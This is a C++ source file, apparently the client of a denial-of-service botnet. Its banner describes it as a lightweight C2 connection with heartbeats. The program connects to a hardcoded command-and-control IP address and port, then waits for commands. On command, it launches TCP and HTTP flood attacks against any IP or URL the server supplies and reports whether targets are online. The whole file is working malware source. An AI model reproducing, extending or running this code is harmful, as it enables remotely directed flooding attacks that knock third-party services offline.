#include <arpa/inet.h>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <iostream>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string>
#include <sys/socket.h>
#include <unistd.h>


// cmds
#include "functions/methods/tcpflood.h"
#include "functions/tools/dnshandler.h"
#include "functions/tools/ping.h"
#include "functions/methods/httpflood.h"



// Compute TCP checksum (including pseudo header)


void stop() {
  
}



int main() {
  std::system("clear");
  std::cout << "lightweight socket connection like a c2 with heartbeats\nby "
               "wispedcats\n"
            << std::endl;

  int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
  if (clientSocket == -1) {
    std::cerr << "error creating socket" << std::endl;
    return 1;
  }

  sockaddr_in serverAddress;
  serverAddress.sin_family = AF_INET;
  serverAddress.sin_port = htons(4959);

  if (inet_pton(AF_INET, "107.149.201.94", &serverAddress.sin_addr) <= 0) {
    std::cerr << "error: unavailable address" << std::endl;
    close(clientSocket);
    return 1;
  }

  if (connect(clientSocket, (struct sockaddr *)&serverAddress,
              sizeof(serverAddress)) <= -1) {
    std::cerr << "error: connection failed!" << std::endl;
    close(clientSocket);
    return 1;
  }

  std::cout << "connected to C2 server" << std::endl;

  std::string message = "ping";
  send(clientSocket, message.c_str(), message.length(), 0);

  while (true) {
    char puffer[1024] = {0};
    int receivedBytes = recv(clientSocket, puffer, 1024, 0);

    if (receivedBytes > 0) {
      std::string receivedData(puffer);
      std::cout << "received from server: " << receivedData << std::endl;

      if (receivedData == "keepalive") {
        send(clientSocket, "pong", 4, 0);
      } else if (receivedData.rfind("tcpflood ", 0) == 0) {
        try {
          size_t space1 = receivedData.find(' ');
          size_t space2 = receivedData.find(' ', space1 + 1);

          std::string protocol = receivedData.substr(0, space1);
          std::string ip = receivedData.substr(space1 + 1, space2 - space1 - 1);
          int port = std::stoi(receivedData.substr(space2 + 1));
          std::cout << protocol << std::endl;
          std::cout << ip << std::endl;
          std::cout << port << std::endl;

          tcpflood(ip, port);
        } catch (...) {
          std::cout << "Syntax: tcp <ip> <port>" << std::endl;
        }
      }
      else if (receivedData.rfind("http ", 0) == 0) {
          try {
              size_t space1 = receivedData.find(' ');
              size_t space2 = receivedData.find(' ', space1 + 1);
              
              std::string cmd = receivedData.substr(0, space1);
              std::string url = receivedData.substr(space1 + 1, space2 - space1 - 1);
              int port = std::stoi(receivedData.substr(space2 + 1));
              
              std::cout << cmd << std::endl;
              std::cout << url << std::endl;
              std::cout << port << std::endl;
              
              httpflood(url, port);
          } catch (...) {
              std::cout << "Syntax: http <url> <port>" << std::endl;
          }
      }
      else if (receivedData.rfind("ping ", 0) == 0) {
        try {
          size_t space1 = receivedData.find(' ');
          size_t space2 = receivedData.find(' ', space1 + 1);
          std::string protocol = receivedData.substr(0, space1);
          std::string ip = receivedData.substr(space1 + 1, space2 - space1 - 1);
          int port = std::stoi(receivedData.substr(space2 + 1));
          std::cout << protocol << std::endl;

          ping(ip, port);
        } catch (...) {
          std::cout << "Syntax: ping <ip>" << std::endl;
        }
      } else {
        if (ping(receivedData, 0) == 0) {
          std::string res = "Target " + receivedData + " is online";
          send(clientSocket, res.c_str(), res.length(), 0);
        } else {
          std::string res = "Target " + receivedData + " is offline/DEAD";
          send(clientSocket, res.c_str(), res.length(), 0);
        }
      }
    } else if (receivedBytes == 0) {
      std::cout << "server closed connection" << std::endl;
      break;
    } else {
      std::cerr << "connection error" << std::endl;
      break;
    }
  }

  close(clientSocket);
  return 0;
}